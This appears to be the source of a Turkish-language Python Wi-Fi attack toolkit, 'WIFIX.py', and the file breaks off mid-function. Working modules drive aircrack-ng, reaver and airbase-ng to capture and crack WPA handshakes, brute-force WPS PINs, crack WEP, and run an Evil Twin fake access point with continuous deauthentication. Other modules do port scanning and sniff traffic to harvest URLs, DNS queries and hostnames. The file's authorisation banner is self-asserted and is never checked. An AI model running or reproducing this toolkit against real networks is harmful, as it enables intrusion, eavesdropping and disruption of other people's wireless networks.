#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════╗
║                    WIFIX.py v3.0                        ║
║         Kapsamlı Wi-Fi & Ağ Güvenlik Aracı               ║
║     Yalnızca Yetkili Pentest ve Eğitim Amaçlıdır        ║
╚══════════════════════════════════════════════════════════╝

Bağımlılıklar:
    sudo apt install -y aircrack-ng reaver bully macchanger nmap arp-scan
    pip3 install scapy requests colorama netifaces
"""

import os
import sys
import time
import re
import signal
import threading
import subprocess
import socket
import ipaddress
import json
import datetime
import random
from typing import List, Dict, Optional, Tuple
from collections import defaultdict, Counter
from queue import Queue

# ============================================================
# GUVENLIK KONTROLU - Yetkilendirme Bildirimi
# ============================================================
print("\n" + "=" * 60)
print("  WIFIX.py v3.0 - Wi-Fi & Ağ Güvenlik Denetim Aracı")
print("  YALNIZCA YETKILI PENTEST ICIN KULLANIN")
print("  Yetkilendirildi: Evet")
print("=" * 60 + "\n")

# ============================================================
# RENK TANIMLARI
# ============================================================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    MAGENTA = '\033[35m'
    WHITE = '\033[37m'

def c(color, text):
    """Renklendirme yardimcisi"""
    return color + str(text) + Colors.ENDC

def banner():
    print(c(Colors.HEADER, """
    ╔═══════════════════════════════════════╗
    ║     ██╗    ██╗██╗███████╗██╗██╗  ██╗║
    ║     ██║    ██║██║██╔════╝██║╚██╗██╔╝║
    ║     ██║ █╗ ██║██║█████╗  ██║ ╚███╔╝ ║
    ║     ██║███╗██║██║██╔══╝  ██║ ██╔██╗ ║
    ║     ╚███╔███╔╝██║██║     ██║██╔╝ ██╗║
    ║      ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝║
    ║     Wi-Fi & Ağ Pentest v3.0          ║
    ║     10 Arac | 4 Hack | 6 Guvenlik    ║
    ╚═══════════════════════════════════════╝
    """))

# ============================================================
# YARDIMCI FONKSIYONLAR
# ============================================================

def check_root():
    """Root yetkisi kontrolu"""
    if os.geteuid() != 0:
        print(c(Colors.FAIL, "[!] Bu arac root yetkisi gerektirir!"))
        print(c(Colors.WARNING, "[*] sudo python3 wifix.py ile calistirin"))
        sys.exit(1)

def check_dependencies():
    """Gerekli araclarin kurulu olup olmadigini kontrol et"""
    required_tools = {
        'airmon-ng': 'aircrack-ng',
        'airodump-ng': 'aircrack-ng',
        'aireplay-ng': 'aircrack-ng',
        'aircrack-ng': 'aircrack-ng',
        'airbase-ng': 'aircrack-ng',
        'reaver': 'reaver',
        'bully': 'bully',
        'macchanger': 'macchanger',
        'nmap': 'nmap',
        'arp-scan': 'arp-scan',
        'iw': 'iw',
        'iwconfig': 'wireless-tools'
    }
    missing = []
    for tool in required_tools:
        result = subprocess.run(['which', tool], capture_output=True, text=True)
        if result.returncode != 0:
            missing.append(required_tools[tool])

    if missing:
        print(c(Colors.WARNING, "[*] Eksik bagimliliklar tespit edildi:"))
        for pkg in set(missing):
            print(c(Colors.WARNING, f"    sudo apt install -y {pkg}"))

        choice = input(c(Colors.OKCYAN, "\n[?] Devam etmek istiyor musunuz? (e/h): "))
        if choice.lower() != 'e':
            sys.exit(1)

def run_command(cmd: str, timeout: int = 30, shell: bool = True) -> Tuple[int, str, str]:
    """Komut calistir ve ciktiyi al"""
    try:
        result = subprocess.run(
            cmd, shell=shell, capture_output=True, text=True,
            timeout=timeout
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "TIMEOUT"
    except Exception as e:
        return -1, "", str(e)

def get_wireless_interfaces() -> List[str]:
    """Kablosuz arayuzleri listele"""
    result = run_command("iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*'")
    interfaces = [i for i in result[1].split('\n') if i]
    return interfaces

def get_all_interfaces() -> List[str]:
    """Tum ag arayuzlerini listele"""
    result = run_command("ip -o link show | awk -F': ' '{print $2}'")
    interfaces = [i.strip() for i in result[1].split('\n') if i.strip() and i.strip() != 'lo']
    return interfaces

def enable_monitor_mode(interface: str) -> Optional[str]:
    """Monitor modunu etkinlestir"""
    print(c(Colors.OKCYAN, f"[*] {interface} icin monitor modu etkinlestiriliyor..."))

    run_command(f"airmon-ng stop {interface}mon 2>/dev/null")
    run_command(f"airmon-ng check kill 2>/dev/null")

    ret, out, err = run_command(f"airmon-ng start {interface}")

    if 'monitor mode enabled' in out.lower() or 'monitor mode' in err.lower():
        mon_iface = f"{interface}mon"
        print(c(Colors.OKGREEN, f"[+] Monitor modu etkin: {mon_iface}"))
        return mon_iface

    mon_iface = f"{interface}mon"
    if os.path.exists(f"/sys/class/net/{mon_iface}"):
        print(c(Colors.OKGREEN, f"[+] Monitor modu etkin: {mon_iface}"))
        return mon_iface

    run_command(f"ip link set {interface} down")
    run_command(f"iw dev {interface} set type monitor")
    run_command(f"ip link set {interface} up")

    ret, out, _ = run_command(f"iwconfig {interface} | grep -i mode")
    if 'monitor' in out.lower():
        print(c(Colors.OKGREEN, f"[+] Monitor modu etkin: {interface}"))
        return interface

    print(c(Colors.FAIL, "[!] Monitor modu etkinlestirilemedi!"))
    return None

def disable_monitor_mode(interface: str):
    """Monitor modunu kapat ve agi geri yukle"""
    print(c(Colors.WARNING, "[*] Monitor modu kapatiliyor..."))
    run_command(f"airmon-ng stop {interface} 2>/dev/null")
    run_command("systemctl restart NetworkManager 2>/dev/null")
    run_command("systemctl restart networking 2>/dev/null")
    print(c(Colors.OKGREEN, "[+] Ag servisleri yeniden baslatildi"))

def randomize_mac(interface: str) -> bool:
    """MAC adresini rastgele degistir"""
    print(c(Colors.OKCYAN, f"[*] {interface} MAC adresi rastgelelestiriliyor..."))
    run_command(f"ip link set {interface} down")
    ret, out, err = run_command(f"macchanger -r {interface}")
    run_command(f"ip link set {interface} up")

    if ret == 0:
        new_mac = ""
        for line in out.split('\n'):
            if 'New MAC' in line or 'Current MAC' in line:
                new_mac = line.split()[-1]
        print(c(Colors.OKGREEN, f"[+] Yeni MAC: {new_mac}"))
        return True
    return False

def get_default_gateway() -> str:
    """Varsayilan gateway'i bul"""
    ret, out, _ = run_command("ip route | grep default | awk '{print $3}' | head -1")
    return out.strip() if out.strip() else "192.168.1.1"

def get_local_network() -> str:
    """Yerel agi bul"""
    ret, out, _ = run_command("ip route | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+/\\d+' | head -1")
    return out.strip() if out.strip() else "192.168.1.0/24"

# ============================================================
# RAPORLAMA SISTEMI
# ============================================================

class ReportManager:
    def __init__(self):
        self.reports = []
        self.start_time = datetime.datetime.now()

    def add(self, module: str, data: dict):
        self.reports.append({
            'timestamp': datetime.datetime.now().isoformat(),
            'module': module,
            'data': data
        })

    def save(self, filename: str = None):
        if not filename:
            filename = f"/tmp/wifix_report_{int(time.time())}.json"

        report = {
            'tool': 'WIFIX.py v3.0',
            'start_time': self.start_time.isoformat(),
            'end_time': datetime.datetime.now().isoformat(),
            'results': self.reports
        }

        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        print(c(Colors.OKGREEN, f"[+] Rapor kaydedildi: {filename}"))
        return filename

report_mgr = ReportManager()

# ============================================================
# MODUL 1: WPA/WPA2 SALDIRISI
# ============================================================

def wpa_attack_menu(mon_iface: str):
    """WPA/WPA2 handshake yakalama ve kirma"""
    print(c(Colors.HEADER, "\n" + "=" * 60))
    print(c(Colors.BOLD, "  [1] WPA/WPA2 SALDIRI MODULU"))
    print(c(Colors.HEADER, "=" * 60))

    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (00:11:22:33:44:55): "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    essid = input(c(Colors.OKCYAN, "[?] ESSID: "))

    if not bssid or len(bssid) != 17:
        print(c(Colors.FAIL, "[!] Gecerli bir BSSID girin!"))
        return False

    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")
        time.sleep(0.5)

    capture_file = f"/tmp/handshake_{int(time.time())}"

    print(c(Colors.OKCYAN, f"\n[*] Handshake yakalama baslatiliyor: {essid} ({bssid})"))
    print(c(Colors.WARNING, "[*] airodump-ng calisiyor..."))

    dump_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {capture_file} {mon_iface} 2>/dev/null &"
    subprocess.Popen(dump_cmd, shell=True)
    time.sleep(2)

    print(c(Colors.WARNING, "[*] Deauth paketleri gonderiliyor..."))
    deauth_cmd = f"aireplay-ng -0 5 -a {bssid} {mon_iface} 2>/dev/null &"
    subprocess.Popen(deauth_cmd, shell=True)

    print(c(Colors.OKCYAN, "[*] 30 saniye bekleniyor..."))
    for i in range(30, 0, -1):
        print(f"\r[*] Bekleniyor: {i} saniye...", end='', flush=True)
        time.sleep(1)
    print()

    run_command("pkill -f 'airodump-ng'")
    time.sleep(1)

    cap_file = f"{capture_file}-01.cap"
    handshake_found = False

    if os.path.exists(cap_file):
        ret, out, _ = run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep -i handshake")
        if '1 handshake' in out.lower() or 'handshake' in out.lower():
            handshake_found = True
            print(c(Colors.OKGREEN, f"\n[+] Handshake yakalandi! Dosya: {cap_file}"))

            wordlist = input(c(Colors.OKCYAN, "\n[?] Wordlist yolu (bos=rockyou): "))
            if not wordlist:
                wordlist = "/usr/share/wordlists/rockyou.txt"
                if not os.path.exists(wordlist):
                    alt_wordlists = [
                        "/usr/share/wordlists/rockyou.txt.gz",
                        "/usr/share/wordlists/fasttrack.txt",
                        "/usr/share/wordlists/fern-wifi/common.txt"
                    ]
                    for wl in alt_wordlists:
                        if os.path.exists(wl):
                            if wl.endswith('.gz'):
                                run_command(f"gunzip -k {wl} 2>/dev/null")
                                wordlist = wl.replace('.gz', '')
                            else:
                                wordlist = wl
                            break

            if os.path.exists(wordlist):
                print(c(Colors.OKCYAN, f"\n[*] aircrack-ng ile kirma baslatiliyor..."))
                crack_cmd = f"aircrack-ng -a 2 -b {bssid} -w {wordlist} {cap_file}"
                os.system(crack_cmd)
            else:
                print(c(Colors.WARNING, f"[!] Wordlist bulunamadi: {wordlist}"))
                print(c(Colors.OKBLUE, f"[*] Cap dosyasi kaydedildi: {cap_file}"))
        else:
            print(c(Colors.WARNING, "\n[!] Handshake yakalanamadi."))
    else:
        print(c(Colors.FAIL, "\n[!] Cap dosyasi olusturulamadi!"))

    report_mgr.add('WPA_Attack', {
        'bssid': bssid, 'essid': essid, 'channel': channel,
        'handshake_found': handshake_found,
        'cap_file': cap_file if os.path.exists(cap_file) else None
    })

    return True

# ============================================================
# MODUL 2: WPS SALDIRISI
# ============================================================

def wps_attack_menu(mon_iface: str):
    """WPS PIN saldirisi"""
    print(c(Colors.HEADER, "\n" + "=" * 60))
    print(c(Colors.BOLD, "  [2] WPS SALDIRI MODULU"))
    print(c(Colors.HEADER, "=" * 60))

    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (00:11:22:33:44:55): "))
    essid = input(c(Colors.OKCYAN, "[?] Hedef ESSID (istege bagli): "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal (istege bagli): "))

    if not bssid or len(bssid) != 17:
        print(c(Colors.FAIL, "[!] Gecerli bir BSSID girin!"))
        return False

    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")

    print(c(Colors.WARNING, "\n[*] Saldiri secenekleri:"))
    print("  1 - Reaver WPS PIN brute force")
    print("  2 - Bully WPS PIN brute force")
    print("  3 - Pixie Dust saldirisi")
    print("  4 - Wash WPS taramasi")

    choice = input(c(Colors.OKCYAN, "\n[?] Seciminiz (1-4): "))

    if choice == '4':
        print(c(Colors.OKCYAN, "[*] WPS aglari taraniyor (30 saniye)..."))
        run_command(f"wash -i {mon_iface} -C 2>/dev/null")
        return True

    if choice == '1':
        print(c(Colors.OKCYAN, f"\n[*] Reaver WPS saldirisi baslatiliyor: {bssid}"))
        pin = input(c(Colors.OKCYAN, "[?] PIN kodu (bos birakilirsa brute force): "))
        cmd = f"reaver -i {mon_iface} -b {bssid} -vv -L -N"
        if pin: cmd += f" -p {pin}"
        if essid: cmd += f" -e '{essid}'"
        print(c(Colors.WARNING, f"\n[*] Calistiriliyor: {cmd}"))
        os.system(cmd)

    elif choice == '2':
        print(c(Colors.OKCYAN, f"\n[*] Bully WPS saldirisi baslatiliyor: {bssid}"))
        cmd = f"bully {mon_iface} -b {bssid} -v 3"
        if essid: cmd += f" -e '{essid}'"
        os.system(cmd)

    elif choice == '3':
        print(c(Colors.OKCYAN, f"\n[*] Pixie Dust saldirisi baslatiliyor: {bssid}"))
        cmd = f"reaver -i {mon_iface} -b {bssid} -vv -K 1 -N -L"
        if essid: cmd += f" -e '{essid}'"
        os.system(cmd)

    report_mgr.add('WPS_Attack', {'bssid': bssid, 'essid': essid, 'method': choice})
    return True

# ============================================================
# MODUL 3: WEP SALDIRISI
# ============================================================

def wep_attack_menu(mon_iface: str):
    """WEP kirma saldirisi"""
    print(c(Colors.HEADER, "\n" + "=" * 60))
    print(c(Colors.BOLD, "  [3] WEP SALDIRI MODULU"))
    print(c(Colors.HEADER, "=" * 60))

    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (00:11:22:33:44:55): "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    essid = input(c(Colors.OKCYAN, "[?] ESSID: "))

    if not bssid or len(bssid) != 17:
        print(c(Colors.FAIL, "[!] Gecerli bir BSSID girin!"))
        return False

    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")

    capture_file = f"/tmp/wep_crack_{int(time.time())}"

    print(c(Colors.OKCYAN, f"\n[*] WEP kirma baslatiliyor: {essid} ({bssid})"))
    dump_cmd = f"airodump-ng -c {channel} --bssid {bssid} -w {capture_file} {mon_iface} 2>/dev/null &"
    subprocess.Popen(dump_cmd, shell=True)

    print(c(Colors.OKCYAN, "[*] ARP replay ile IV uretimi baslatiliyor..."))
    replay_cmd = f"aireplay-ng -3 -b {bssid} {mon_iface} 2>/dev/null &"
    subprocess.Popen(replay_cmd, shell=True)

    print(c(Colors.WARNING, "\n[*] En az 20.000 IV toplanmasi gerekiyor. 60 saniye bekleniyor..."))
    for i in range(60, 0, -5):
        print(f"\r[*] Bekleniyor: {i} saniye...", end='', flush=True)
        time.sleep(5)
    print()

    run_command("pkill -f 'airodump-ng'")
    run_command("pkill -f 'aireplay-ng'")
    time.sleep(1)

    cap_file = f"{capture_file}-01.cap"
    if os.path.exists(cap_file):
        print(c(Colors.OKCYAN, f"\n[*] aircrack-ng ile WEP kiriliyor..."))
        os.system(f"aircrack-ng -a 1 -b {bssid} {cap_file}")
    else:
        print(c(Colors.FAIL, "[!] Cap dosyasi bulunamadi!"))

    report_mgr.add('WEP_Attack', {'bssid': bssid, 'essid': essid, 'channel': channel})
    return True

# ============================================================
# MODUL 4: IKIli SEYTANI SALDIRI (Evil Twin + Deauth)
# ============================================================

def evil_twin_attack(mon_iface: str):
    """Evil Twin (Fake AP) + Deauth kombinasyon saldirisi"""
    print(c(Colors.HEADER, "\n" + "=" * 60))
    print(c(Colors.BOLD, "  [4] IKIli SEYTANI SALDIRI MODULU"))
    print(c(Colors.MAGENTA, "  Evil Twin + Deauth Kombinasyonu"))
    print(c(Colors.HEADER, "=" * 60))

    print(c(Colors.WARNING, "[!] UYARI: Bu saldiri yetkisiz kullanimi yasa disidir!"))
    confirm = input(c(Colors.OKCYAN, "[?] Devam etmek istiyor musunuz? (evet/hayir): "))
    if confirm.lower() != 'evet':
        return False

    essid = input(c(Colors.OKCYAN, "[?] Hedef ESSID (Kopyalanacak ag adi): "))
    channel = input(c(Colors.OKCYAN, "[?] Kanal: "))
    bssid = input(c(Colors.OKCYAN, "[?] Hedef BSSID (Deauth icin): "))

    if not essid:
        print(c(Colors.FAIL, "[!] ESSID gerekli!"))
        return False

    if channel:
        run_command(f"iw dev {mon_iface} set channel {channel}")

    print(c(Colors.OKCYAN, f"\n[*] Evil Twin AP baslatiliyor: {essid}"))

    # airbase-ng ile fake AP
    fake_ap_cmd = f"airbase-ng -e '{essid}' -c {channel or '6'} {mon_iface} 2>/dev/null &"
    subprocess.Popen(fake_ap_cmd, shell=True)
    time.sleep(2)

    # DHCP server kur
    print(c(Colors.OKCYAN, "[*] DHCP sunucusu yapilandiriliyor..."))
    run_command("ifconfig at0 up 192.168.99.1 netmask 255.255.255.0 2>/dev/null")
    run_command("echo '1' > /proc/sys/net/ipv4/ip_forward")

    # Deauth baslat
    if bssid and len(bssid) == 17:
        print(c(Colors.WARNING, f"[*] {bssid} hedefine deauth gonderiliyor..."))
        deauth_cmd = f"aireplay-ng -0 0 -a {bssid} {mon_iface} 2>/dev/null &"
        subprocess.Popen(deauth_cmd, shell=True)

    print(c(Colors.OKGREEN, "\n[+] Ikili Seytani Saldiri aktif!"))
    print(c(Colors.OKBLUE, "[*] Fake AP: at0 arayuzu uzerinde calisiyor"))
    print(c(Colors.OKBLUE, "[*] Istemcilerin baglanmasini bekleyin..."))
    print(c(Colors.WARNING, "[*] Durdurmak icin Ctrl+C"))

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(c(Colors.WARNING, "\n[!] Saldiri durduruldu. Temizleniyor..."))
        run_command("pkill -f 'airbase-ng'")
        run_command("pkill -f 'aireplay-ng'")
        run_command("ifconfig at0 down 2>/dev/null")

    report_mgr.add('Evil_Twin', {'essid': essid, 'channel': channel, 'bssid': bssid})
    return True

# ============================================================
# MODUL 5: PORT TARAMA
# ============================================================

COMMON_PORTS = {
    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
    53: 'DNS', 80: 'HTTP', 110: 'POP3', 111: 'RPC',
    135: 'MSRPC', 139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS',
    445: 'SMB', 514: 'Syslog', 993: 'IMAPS', 995: 'POP3S',
    1433: 'MSSQL', 1521: 'Oracle', 2049: 'NFS', 3306: 'MySQL',
    3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
    8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 27017: 'MongoDB'
}

def scan_port(ip: str, port: int, timeout: float = 1.0) -> Tuple[int, bool, str]:
    """TCP port taramasi"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()

        if result == 0:
            service = COMMON_PORTS.get(port, 'Unknown')
            try:
                banner_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                banner_sock.settimeout(2)
                banner_sock.connect((ip, port))
                banner_sock.send(b'\r\n')
                banner_data = banner_sock.recv(1024).decode('utf-8', errors='ignore')
                banner_sock.close()
                return (port, True, f"{service}|{banner_data.strip()[:50]}")
            except:
                return (port, True, service)
        return (port, False, '')
    except:
        return (port, False, '')

def port_scan_menu():
    """Port tarama menusu"""
    print(c(Colors.HEADER, "\n" + "=" * 60))
    print(c(Colors.BOLD, "  [5] PORT TARAMA MODULU"))
    print(c(Colors.HEADER, "=" * 60))

    target = input(c(Colors.OKCYAN, "[?] Hedef IP adresi: "))

    print(c(Colors.OKBLUE, "[*] Port secenekleri:"))
    print("  1 - Yaygin portlar (1-1024)")
    print("  2 - Tum portlar (1-65535)")
    print("  3 - Sik kullanilan portlar (top 30)")
    print("  4 - Ozel port araligi")
    choice = input(c(Colors.OKCYAN, "[?] Seciminiz (1-4): "))

    ports = []
    if choice == '1':
        ports = list(range(1, 1025))
    elif choice == '2':
        ports = list(range(1, 65536))
    elif choice == '3':
        ports = list(COMMON_PORTS.keys())
    elif choice == '4':
        start = int(input(c(Colors.OKCYAN, "[?] Baslangic portu: ")))
        end = int(input(c(Colors.OKCYAN, "[?] Bitis portu: ")))
        ports = list(range(start, end + 1))
    else:
        ports = list(COMMON_PORTS.keys())

    print(c(Colors.OKCYAN, f"\n[*] {len(ports)} port taraniyor... Hedef: {target}"))
    print(c(Colors.WARNING, "[*] Bu islem birkac dakika surebilir...\n"))

    open_ports = []
    progress_lock = threading.Lock()
    scanned = [0]
    start_time = time.time()

    def worker(port_list):
        for port in port_list:
            _, is_open, service = scan_port(target, port, timeout=0.5)
            if is_open:
                with progress_lock:
                    open_ports.append((port, service))
            with progress_lock:
                scanned[0] += 1
                if scanned[0] % 100 == 0 or scanned[0] == len(ports):
                    elapsed = time.time() - start_time
                    pct = (scanned[0] / len(ports)) * 100
                    print(f"\r[*] Ilerleme: %{pct:.1f} | {scanned[0]}/{len(ports)} | Acik: {len(open_ports)} | Sure: {elapsed:.1f}s", end='', flush=True)

    num_threads = 50
    chunk_size = max(1, len(ports) // num_threads)
    threads = []

    for i in range(0, len(ports), chunk_size):
        chunk = ports[i:i + chunk_size]
        t = threading.Thread(target=worker, args=(chunk,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    elapsed = time.time() - start_time
    print(f"\n\n{c(Colors.OKGREEN, f'[+] Tarama tamamlandi! Sure: {elapsed:.1f}s')}")

    if open_ports:
        open_ports.sort(key=lambda x: x[0])
        print(c(Colors.OKGREEN, f"\n[+] Acik portlar ({len(open_ports)}):"))
        print("-" * 70)
        print(f"{'PORT':<10} {'SERVIS':<20} {'BANNER / DETAY':<40}")
        print("-" * 70)
        for port, service in open_ports:
            parts = service.split('|', 1)
            serv_name = parts[0]
            banner_info = parts[1] if len(parts) > 1 else ''
            print(f"{f'{port}/tcp':<10} {serv_name:<20} {banner_info:<40}")
    else:
        print(c(Colors.WARNING, "\n[!] Acik port bulunamadi."))

    report_mgr.add('Port_Scan', {'target': target, 'open_ports': open_ports, 'duration': elapsed})
    return open_ports

# ============================================================
# MODUL 6: AG TRAFICI DINLEME & ANALIZ
# ============================================================

def network_monitor_menu(interface: str):
    """Ag trafigini dinle ve analiz et"""
    print(c(Colors.HEADER, "\n" + "=" * 60))
    print(c(Colors.BOLD, "  [6] AG TRAFICI DINLEME & ANALIZ MODULU"))
    print(c(Colors.HEADER, "=" * 60))

    if not interface:
        interfaces = get_all_interfaces()
        if not interfaces:
            print(c(Colors.FAIL, "[!] Arayuz bulunamadi!"))
            return
        print(c(Colors.OKBLUE, "\n[*] Mevcut arayuzler:"))
        for i, iface in enumerate(interfaces):
            print(f"  {i+1} - {iface}")
        choice = input(c(Colors.OKCYAN, "\n[?] Arayuz secin (1): "))
        try:
            idx = int(choice) - 1 if choice else 0
            interface = interfaces[idx]
        except:
            interface = interfaces[0]

    print(c(Colors.OKCYAN, "\n[*] Dinleme secenekleri:"))
    print("  1 - Hizli paket analizi (30 saniye)")
    print("  2 - HTTP trafigi izleme")
    print("  3 - DNS sorgularini izle")
    print("  4 - DHCP isteklerini izle")
    print("  5 - ARP trafigi izle")
    print("  6 - Tum protokoller (surekli)")

    choice = input(c(Colors.OKCYAN, "\n[?] Seciminiz (1-6): "))

    try:
        from scapy.all import sniff, Ether, IP, TCP, UDP, DNS, DHCP, ARP, Raw
    except ImportError:
        print(c(Colors.WARNING, "[!] Scapy kurulu degil. Yukleniyor..."))
        os.system("pip3 install scapy 2>/dev/null")
        from scapy.all import sniff, Ether, IP, TCP, UDP, DNS, DHCP, ARP, Raw

    stats = {
        'total': 0, 'tcp': 0, 'udp': 0, 'dns': 0, 'dhcp': 0,
        'http': 0, 'https': 0, 'arp': 0, 'other': 0,
        'unique_ips': set(), 'urls': [], 'dns_queries': [],
        'dhcp_discover': [], 'arp_packets': []
    }

    start_time = time.time()

    def analyze_packet(packet):
        stats['total'] += 1

        if packet.haslayer(ARP):
            stats['arp'] += 1
            arp = packet[ARP]
            stats['arp_packets'].append({
                'src_ip': arp.psrc, 'dst_ip': arp.pdst,
                'src_mac': arp.hwsrc, 'dst_mac': arp.hwdst,
                'op': 'request' if arp.op == 1 else 'reply'
            })

        if packet.haslayer(IP):
            ip_layer = packet[IP]
            stats['unique_ips'].add(ip_layer.src)
            stats['unique_ips'].add(ip_layer.dst)

            if packet.haslayer(TCP):
                stats['tcp'] += 1
                tcp = packet[TCP]
                if tcp.dport == 80 or tcp.sport == 80:
                    stats['http'] += 1
                    if packet.haslayer(Raw):
                        try:
                            payload = packet[Raw].load.decode('utf-8', errors='ignore')
                            for line in payload.split('\n'):
                                if line.startswith(('GET ', 'POST ', 'Host:')):
                                    stats['urls'].append(line.strip()[:100])
                        except:
                            pass
                if tcp.dport == 443 or tcp.sport == 443:
                    stats['https'] += 1

            if packet.haslayer(UDP):
                stats['udp'] += 1
                udp = packet[UDP]
                if packet.haslayer(DNS):
                    stats['dns'] += 1
                    dns = packet[DNS]
                    if dns.qr == 0:
                        try:
                            qname = dns.qd.qname.decode('utf-8', errors='ignore')
                            stats['dns_queries'].append(qname)
                        except:
                            pass
                if packet.haslayer(DHCP):
                    stats['dhcp'] += 1
                    try:
                        if packet[DHCP].options:
                            for opt in packet[DHCP].options:
                                if isinstance(opt, tuple) and opt[0] == 'hostname':
                                    stats['dhcp_discover'].append(opt[1].decode('utf-8', errors='ignore'))
                    except:
                        pass

    duration_map = {'1': 30, '2': 60, '3': 30, '4': 30, '5': 30, '6': 0}
    duration = duration_map.get(choice, 30)

    if duration > 0:
        print(c(Colors.OKCYAN, f"\n[*] {duration} saniye boyunca dinleniyor..."))
        sniff(iface=interface, prn=analyze_packet, timeout=duration, store=0)
    else:
        print(c(Colors.OKCYAN, "\n[*] Surekli dinleme baslatildi (Ctrl+C ile durdurun)..."))
        try:
            sniff(iface=interface, prn=analyze_packet, store=0)
        except KeyboardInterrupt:
            pass

    elapsed = time.time() - start_time

    print(c(Colors.HEADER, f"\n{'='*60}"))
    print(c(Colors.BOLD, f"  AG ANALIZ RAPORU ({elapsed:.1f} sn)"))
    print(c(Colors.HEADER, f"{'='*60}"))

    print(f"\n{c(Colors.OKBLUE)}[ISTATISTIKLER]{c(Colors.ENDC)}")
    print(f"  Toplam paket: {stats['total']}")
    print(f"  TCP: {stats['tcp']} | UDP: {stats['udp']} | ARP: {stats['arp']}")
    print(f"  HTTP: {stats['http']} | HTTPS: {stats['https']}")
    print(f"  DNS: {stats['dns']} | DHCP: {stats['dhcp']}")
    print(f"  Benzersiz IP: {len(stats['unique_ips'])}")

    if stats['dns_queries']:
        print(f"\n{c(Colors.OKBLUE)}[DNS SORGULARI]{c(Colors.ENDC)}")
        for q in list(set(stats['dns_queries']))[:10]:
            print(f"  - {q}")

    if stats['urls']:
        print(f"\n{c(Colors.OKBLUE)}[HTTP ISTEKLERI]{c(Colors.ENDC)}")
        for url in stats['urls'][:10]:
            print(f"  - {url}")

    if stats['arp_packets']:
        print(f"\n{c(Colors.OKBLUE)}[ARP TRAFICI]{c(Colors.ENDC)}")
        for arp in stats['arp_packets'][:10]:
            print(f"  {arp['op']}: {arp['src_ip']} ({arp['src_mac']}) -> {arp['dst_ip']}")

    if stats['unique_ips']:
        print(f"\n{c(Colors.OKBLUE)}[TESPIT EDILEN IP'LER]{c(Colors.ENDC)}")
        for ip in sorted(stats['unique_ips'])[:20]:
            print(f"  - {ip}")

    report_mgr.add('Network_Monitor', {
        'interface': interface, 'duration': elapsed,
        'stats': {k: list(v) if isinstance(v, set) else v for k, v in stats.items()}
    })
    return stats

# ============================================================
# MODUL 7: IP/CiHAZ TARAMA & KESIF
# ============================================================

def scan_ip_ping(ip: str, timeout: float = 0.5) -> bool:
    """Ping atarak IP kontrolu"""
    try:
        result = subprocess.run(
            ['ping', '-c', '1', '-W', str(int(timeout)), ip],
            capture_output=True, timeout=timeout + 1
        )
        return result.returncode == 0
    except:
        return False

def arp_scan(network: str) -> List[Dict]:
    """ARP kullanarak ag taramasi"""
    results = []
    ret, out, err = run_command(f"arp-scan --localnet 2>/dev/null || nmap -sn {network} 2>/dev/null")

    if ret == 0:
        for line in out.split('\n'):
            if '\t' in line:
                parts = line.split('\t')
                if len(parts) >= 2:
                    ip = parts[0].strip()
                    mac = parts[1].strip()
                    vendor = parts[2].strip() if len(parts) > 2 else ''
                    results.append({'ip': ip, 'mac': mac, 'vendor': vendor})
    return results

def ip_scan_menu():
    """IP tarama menusu"""
    print(c(Colors.HEADER, "\n" + "=" * 60))
    print(c(Colors.BOLD, "  [7] IP/CiHAZ TARAMA & KESIF MODULU"))
    print(c(Colors.HEADER, "=" * 60))

    network = input(c(Colors.OKCYAN, f"[?] Taranacak ag (bos={get_local_network()}): "))
    if not network:
        network = get_local_network()

    print(c(Colors.OKBLUE, f"[*] Taranacak ag: {network}"))
    print(c(Colors.OKCYAN, "\n[*] ARP taramasi yapiliyor..."))
    devices = arp_scan(network)

    print(c(Colors.OKCYAN, "[*] Ping taramasi yapiliyor..."))
    net = ipaddress.ip_network(network, strict=False)
    active_ips = []

    def ping_host(ip_str):
        if scan_ip_ping(ip_str):
            active_ips.append(ip_str)

    threads = []
    for host in net.hosts():
        t = threading.Thread(target=ping_host, args=(str(host),))
        threads.append(t)
        t.start()
        if len(threads) >= 100:
            for t2 in threads:
                t2.join()
            threads = []

    for t in threads:
        t.join()

    print(c(Colors.OKGREEN, f"\n[+] Aktif cihazlar ({len(active_ips)}):"))
    print("-" * 50)
    print(f"{'IP Adresi':<18} {'Durum':<10}")
    print("-" * 50)
    for ip in sorted(active_ips, key=lambda x: int(x.split('.')[-1])):
        print(f"{ip:<18} {c(Colors.OKGREEN, 'Aktif'):<10}")

    if devices:
        print(c(Colors.OKCYAN, f"\n[*] ARP ile detayli cihazlar ({len(devices)}):"))
        print("-" * 70)
        print(f"{'IP':<16} {'MAC':<20} {'Uretici':<30}")
        print("-" * 70)
        for d in devices:
